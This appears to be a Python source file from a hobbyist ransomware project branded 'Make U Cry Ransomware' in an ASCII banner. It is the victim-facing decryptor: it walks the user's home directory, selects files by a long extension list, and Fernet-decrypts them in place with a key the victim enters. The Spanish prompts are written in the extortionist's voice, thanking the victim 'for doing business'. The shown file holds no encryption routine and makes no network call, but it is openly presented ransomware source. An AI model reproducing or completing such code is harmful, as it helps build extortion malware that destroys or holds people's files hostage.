from cryptography.fernet import Fernet
from datetime import datetime
from tkinter import messagebox
from sys import stdout
import os
import platform
import requests

Banner = '''

 ███▄ ▄███▓ ▄▄▄       ██ ▄█▀▓█████     █    ██     ▄████▄   ██▀███ ▓██   ██▓                  
▓██▒▀█▀ ██▒▒████▄     ██▄█▒ ▓█   ▀     ██  ▓██▒   ▒██▀ ▀█  ▓██ ▒ ██▒▒██  ██▒                  
▓██    ▓██░▒██  ▀█▄  ▓███▄░ ▒███      ▓██  ▒██░   ▒▓█    ▄ ▓██ ░▄█ ▒ ▒██ ██░                  
▒██    ▒██ ░██▄▄▄▄██ ▓██ █▄ ▒▓█  ▄    ▓▓█  ░██░   ▒▓▓▄ ▄██▒▒██▀▀█▄   ░ ▐██▓░                  
▒██▒   ░██▒ ▓█   ▓██▒▒██▒ █▄░▒████▒   ▒▒█████▓    ▒ ▓███▀ ░░██▓ ▒██▒ ░ ██▒▓░                  
░ ▒░   ░  ░ ▒▒   ▓▒█░▒ ▒▒ ▓▒░░ ▒░ ░   ░▒▓▒ ▒ ▒    ░ ░▒ ▒  ░░ ▒▓ ░▒▓░  ██▒▒▒                   
░  ░      ░  ▒   ▒▒ ░░ ░▒ ▒░ ░ ░  ░   ░░▒░ ░ ░      ░  ▒     ░▒ ░ ▒░▓██ ░▒░                   
░      ░     ░   ▒   ░ ░░ ░    ░       ░░░ ░ ░    ░          ░░   ░ ▒ ▒ ░░                    
       ░         ░  ░░  ░      ░  ░      ░        ░ ░         ░     ░ ░                       
                                                  ░                 ░ ░                       
 ██▀███   ▄▄▄       ███▄    █   ██████  ▒█████   ███▄ ▄███▓ █     █░ ▄▄▄       ██▀███  ▓█████ 
▓██ ▒ ██▒▒████▄     ██ ▀█   █ ▒██    ▒ ▒██▒  ██▒▓██▒▀█▀ ██▒▓█░ █ ░█░▒████▄    ▓██ ▒ ██▒▓█   ▀ 
▓██ ░▄█ ▒▒██  ▀█▄  ▓██  ▀█ ██▒░ ▓██▄   ▒██░  ██▒▓██    ▓██░▒█░ █ ░█ ▒██  ▀█▄  ▓██ ░▄█ ▒▒███   
▒██▀▀█▄  ░██▄▄▄▄██ ▓██▒  ▐▌██▒  ▒   ██▒▒██   ██░▒██    ▒██ ░█░ █ ░█ ░██▄▄▄▄██ ▒██▀▀█▄  ▒▓█  ▄ 
░██▓ ▒██▒ ▓█   ▓██▒▒██░   ▓██░▒██████▒▒░ ████▓▒░▒██▒   ░██▒░░██▒██▓  ▓█   ▓██▒░██▓ ▒██▒░▒████▒
░ ▒▓ ░▒▓░ ▒▒   ▓▒█░░ ▒░   ▒ ▒ ▒ ▒▓▒ ▒ ░░ ▒░▒░▒░ ░ ▒░   ░  ░░ ▓░▒ ▒   ▒▒   ▓▒█░░ ▒▓ ░▒▓░░░ ▒░ ░
  ░▒ ░ ▒░  ▒   ▒▒ ░░ ░░   ░ ▒░░ ░▒  ░ ░  ░ ▒ ▒░ ░  ░      ░  ▒ ░ ░    ▒   ▒▒ ░  ░▒ ░ ▒░ ░ ░  ░
  ░░   ░   ░   ▒      ░   ░ ░ ░  ░  ░  ░ ░ ░ ▒  ░      ░     ░   ░    ░   ▒     ░░   ░    ░   
   ░           ░  ░         ░       ░      ░ ░         ░       ░          ░  ░   ░        ░  ░
    '''
user = os.getlogin()
Windows_dir = f'C:\\Users\\{user}'
Linux_dir = '/home/'
plataforma = platform.system()
fecha = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
extensiones = 'rar','php','jpg','png','mp3','mp4','zip','rar','cs','webp','txt','docx','bat','iso','gif','jpeg','psd','pdf','sh','bin','php','dll','exe','pptx','xml','xlsx','html','js'

def dir_finder(dir_inicio):
        for dirpath, dirs, files in os.walk(dir_inicio):
            for i in files:
                absolute_dir = os.path.abspath(os.path.join(dirpath, i))
                ext = absolute_dir.split('.')[-1]
                if ext in extensiones:
                    yield absolute_dir

def decrypt():   
    #identifica el sistema operativo y asigna el directorio que el corresponde 
    if (plataforma == 'Windows'):
        x = dir_finder(Windows_dir)
    elif (plataforma == 'Linux' or plataforma == 'Darwin'):
        x = dir_finder(Linux_dir)
    else:
        messagebox.showerror(title='Error de compatibilidad', message='Te me salvaste... digo\nTu host no es compatible con este amigable programa')
        exit

    e = Fernet(llave)
    
    for i in x:
        print(f'decypting --> {i}')
        with open(i, 'rb') as file:
            file_data = file.read()
        decrypted = e.decrypt(file_data)
        with open(i, 'wb') as file:
            file.write(decrypted) 

def red():
    RED = "\033[1;31m"
    stdout.write(RED)

def green():
    GREEN = "\033[0;32m"
    stdout.write(GREEN)

if __name__ == '__main__':
    red()
    print(Banner)
    llave = input(f'ASEGURATE DE NO EQUIVOCARTE, SI LO HACES LA LLAVE NO SERVIRA Y PIERDES TODOS TUS ARCHIVOS\ningresa tu llave {user} -->')
    green()
    print ('Gracias por hacer negocios conmigo :D. si quieres lo ejecutas otra vez')
    decrypt()
    print(Banner)



